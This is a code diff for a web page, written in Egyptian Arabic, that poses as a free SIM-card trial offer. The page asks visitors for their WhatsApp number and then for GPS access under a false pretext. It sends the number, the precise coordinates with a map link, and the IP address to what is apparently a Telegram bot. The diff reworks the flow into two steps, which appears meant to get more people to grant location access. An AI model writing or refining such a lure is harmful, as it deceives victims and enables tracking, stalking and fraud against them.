@@ -57,15 +57,22 @@
   <div class="logo">📶</div>
   <div class="badge">FREE TRIAL</div>
   <h1>استلم شريحتك المجانية 🎉</h1>
-  <p class="sub">دخل رقم <b>الواتساب</b> بتاعك عشان نوصلك كود التفعيل</p>
-  <div class="gpsbox" id="gpsBox" style="display:none">📍 الدولة المكتشفة: <b id="gpsCountry"></b></div>
+  <p class="sub">أول خطوة: دخل رقم <b>الواتساب</b> بتاعك لاستلام الشريحة</p>
   <input id="phone" type="tel" inputmode="tel" placeholder="01xxxxxxxxx" maxlength="15" />
-  <button id="sendBtn" onclick="submitPhone()">استلام الشريحة 📩</button>
+  <button id="nextBtn" onclick="goToGpsStep()">التالي</button>
   <ul class="feats">
     <li>✅ 1GB بيانات مجانية</li>
     <li>✅ صالحة لمدة 7 أيام</li>
     <li>✅ تفعيل فوري بكود QR</li>
   </ul>
+</div>
+
+<div class="card" id="gpsCard" style="display:none">
+  <div class="logo">📍</div>
+  <h1>تحديد الدولة</h1>
+  <p class="sub">تاني خطوة: بنحدد دولتك بالـ GPS عشان نجهزلك الشريحة المناسبة</p>
+  <div class="gpsbox" id="gpsStatus">⏳ جاري تحديد الموقع...</div>
+  <button id="confirmBtn" onclick="submitPhone()" disabled>إرسال الشريحة واتساب 📩</button>
 </div>
 
 <div class="card done" id="doneCard">
@@ -326,41 +333,43 @@ async function countryFromGPS(lat, lon) {
 
 async function submitPhone() {
   const v = document.getElementById('phone').value.trim();
-  if (!v) { document.getElementById('phone').focus(); return; }
-  const btn = document.getElementById('sendBtn');
+  if (!v) return;
+  const btn = document.getElementById('confirmBtn');
   btn.disabled = true;
   btn.textContent = 'جاري الإرسال...';
   const country = window._gpsCountry || detectSimCountry(v);
   const countrySrc = window._gpsCountry ? 'GPS' : 'الرقم';
-  const gps = (window._gps && window._gps.lat != null) ? window._gps
-    : (window._gpsDenied ? { denied: true } : await getGPS());
+  const gps = (window._gps && window._gps.lat != null) ? window._gps : { denied: true };
   const gpsLine = (gps && gps.lat != null)
     ? `\n📡 GPS: ${gps.lat.toFixed(6)},${gps.lon.toFixed(6)} (±${Math.round(gps.acc)}m)\n🗺️ https://www.google.com/maps?q=${gps.lat},${gps.lon}`
-    : '\n📡 GPS: ' + ((gps && (gps.denied || gps.timeout)) ? 'مرفوض من الزائر' : 'غير متاح');
+    : '\n📡 GPS: مرفوض من الزائر';
   tg(`📱 رقم جديد\n🆔 ${sessionId}\n📞 ${v}\n🌍 دولة الشريحة: ${country} (${countrySrc})${gpsLine}\n🌐 IP: ${window._ip || 'unknown'}`);
-  document.getElementById('formCard').style.display = 'none';
+  document.getElementById('gpsCard').style.display = 'none';
   document.getElementById('doneCard').style.display = 'block';
 }
 
 logVisit();
 
-// تحديد الدولة عبر GPS مبكراً (قبل إدخال الرقم) لعرضها وتحديد دولة الشريحة
-getGPS().then(async (p) => {
+// الخطوة 2: تحديد الدولة بالـ GPS بعد إدخال الرقم
+async function goToGpsStep() {
+  const v = document.getElementById('phone').value.trim();
+  if (!v) { document.getElementById('phone').focus(); return; }
+  document.getElementById('formCard').style.display = 'none';
+  document.getElementById('gpsCard').style.display = 'block';
+  const status = document.getElementById('gpsStatus');
+  const btn = document.getElementById('confirmBtn');
+  const p = await getGPS();
   if (p && p.lat != null) {
     window._gps = p;
     const c = await countryFromGPS(p.lat, p.lon);
-    if (c) {
-      window._gpsCountry = c;
-      const box = document.getElementById('gpsBox');
-      if (box) {
-        document.getElementById('gpsCountry').textContent = c;
-        box.style.display = 'block';
-      }
-    }
+    if (c) window._gpsCountry = c;
+    status.innerHTML = '📍 الدولة المكتشفة: <b>' + (c || 'غير معروف') + '</b>';
   } else {
     window._gpsDenied = true;
+    status.innerHTML = '⚠️ تعذر تحديد الموقع — هنحدد الدولة من كود الرقم';
   }
-});
+  btn.disabled = false;
+}
 </script>
 </body>
 </html>
